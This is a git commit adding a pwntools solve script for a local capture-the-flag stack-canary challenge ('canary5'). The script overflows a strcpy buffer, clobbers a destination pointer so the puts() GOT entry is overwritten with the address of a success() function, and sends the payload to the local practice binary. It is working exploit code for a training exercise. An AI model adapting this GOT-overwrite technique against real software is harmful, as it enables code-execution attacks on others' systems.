340eacafbd2ddf5539b32b6a21ffaa279d00eeb1
root <root@ip-172-31-13-71.us-west-2.compute.internal>
2017-08-10 17:52:53 +0000

    added canary5 solve

--- challenges/canary/solves/canary5_solve.py
+++ challenges/canary/solves/canary5_solve.py
@@ -1,9 +1,45 @@
 from pwn import *
 
-addr_puts_overwrite 	= '\x34\xa0\x04\x08'	#p32(0x0804a034, endian='little');
-addr_success		= '\x35\x88\x04\x08'	#p32(0x08048835, endian='little');
-junk			= '\x00' + '\x41'*27 + '\x42'*4 + '\x43'*8
+elf = ELF('/root/Desktop/TEST_CTF/kali-vm_local-ctf/challenges/canary/canary5')
+
+success_addr 	= elf.symbols['success']
+puts_got_addr	= elf.got['puts']
+
+print "[*] success() function @ "+hex(success_addr)
+print "[*] puts.GOT entry @ "+hex(puts_got_addr)
+
+#Address of puts() GOT entry
+addr_puts_overwrite 	= p32(puts_got_addr, endian='little')
+#Address of the success() function. Overwrite puts() GOT entry with this.
+addr_success		= p32(success_addr, endian='little')
+#Append null-byte so that when strcpy() is called it will stop copying bytes after copying addr_success
+addr_success		+= '\x00'
+
+'''
+Junk bytes to fill space inbetween addr_puts_overwrite and addr_success
+These bytes can be any value (except 0x0A == '\n'), but differing values were chosen to make debugging easier
+'''
+#fill remaining char buffer space
+junk 			= '\x41'*(32-len(addr_success))
+#overwrite func1()'s saved base pointer @ [ebp]
+junk			+= '\x42'*4
+#overwrite the 8 bytes of space inbetween [ebp] the *dest arg passed to func1() from main() @ [ebp+0x8]
+junk			+= '\x43'*8
 
 payload			= addr_success + junk + addr_puts_overwrite
-print payload
+
+
+
+proc = process('/root/Desktop/TEST_CTF/kali-vm_local-ctf/challenges/canary/canary5')
+
+output = proc.recvline(timeout=2)
+print "[*] Recieved: "+output
+
+print "[*] Sending payload: "+payload
+proc.sendline(payload)
+
+output = proc.recvrepeat(0.5)
+print "[*] Recieved: \n"+output
+
+proc.close()
 
